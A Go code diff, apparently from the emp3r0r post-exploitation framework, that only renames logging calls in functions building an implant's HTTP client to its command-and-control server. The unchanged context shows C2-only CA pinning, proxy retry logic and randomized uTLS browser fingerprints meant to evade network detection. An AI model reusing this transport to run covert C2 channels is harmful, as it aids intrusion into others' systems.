@@ -50,12 +50,12 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 
 	// fingerprint of CA
 	ca_crt, _ := ParsePem(CACrtPEM)
-	logging.Printf("CA cert fingerprint: %s, now making proxy dialer", sha256SumRaw(ca_crt.Raw))
+	logging.Infof("CA cert fingerprint: %s, now making proxy dialer", sha256SumRaw(ca_crt.Raw))
 
 	// set proxyURL to nil to use direct connection for C2 transport
 	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
 	if proxyServer != "" {
-		logging.Printf("Using proxy server: %s", proxyServer)
+		logging.Infof("Using proxy server: %s", proxyServer)
 		// use a proxy for our HTTP client
 		proxyUrl, e := url.Parse(proxyServer)
 		if e != nil {
@@ -68,21 +68,21 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 	// transport of our http client, with configured TLS client
 	try := 0
 init_transport:
-	logging.Printf("Initializing transport (%s)...", c2url)
+	logging.Infof("Initializing transport (%s)...", c2url)
 	tr, err := makeTransport(c2url, clientHelloIDMap["hellorandomizedalpn"], config, proxyDialer)
 	try++
 	if err != nil {
 		if proxyServer != "" && try < 5 {
-			logging.Printf("Proxy server (%s) down, retrying (%d)...", proxyServer, try)
+			logging.Infof("Proxy server (%s) down, retrying (%d)...", proxyServer, try)
 			util.TakeASnap(false)
 			goto init_transport
 		} else {
-			logging.Printf("Error initializing transport (%s): makeRoundTripper: %v", c2url, err)
+			logging.Infof("Error initializing transport (%s): makeRoundTripper: %v", c2url, err)
 			return nil
 		}
 	}
 
-	logging.Printf("Transport initialized (%s)", c2url)
+	logging.Infof("Transport initialized (%s)", c2url)
 	return &http.Client{Transport: tr}
 }
 
@@ -97,14 +97,14 @@ func CreatePreflightHTTPClient(c2Addr string) *http.Client {
 	}
 	c2url, err := url.Parse(addr)
 	if err != nil {
-		logging.Printf("Error parsing C2 address '%s': %v", addr, err)
+		logging.Infof("Error parsing C2 address '%s': %v", addr, err)
 		return nil
 	}
 
 	// Create a cert pool with only C2's CA cert
 	rootCAs, err := ExtractCABundle(CACrtPEM)
 	if err != nil {
-		logging.Printf("ExtractCABundle: %v", err)
+		logging.Infof("ExtractCABundle: %v", err)
 		return nil
 	}
 
@@ -120,7 +120,7 @@ func CreatePreflightHTTPClient(c2Addr string) *http.Client {
 	// This avoids the heavy initialization and retry logic in CreateEmp3r0rHTTPClient
 	rt, err := NewUTLSRoundTripper("hellorandomizedalpn", config, nil)
 	if err != nil {
-		logging.Printf("Error creating uTLS round tripper: %v", err)
+		logging.Infof("Error creating uTLS round tripper: %v", err)
 		return nil
 	}
 
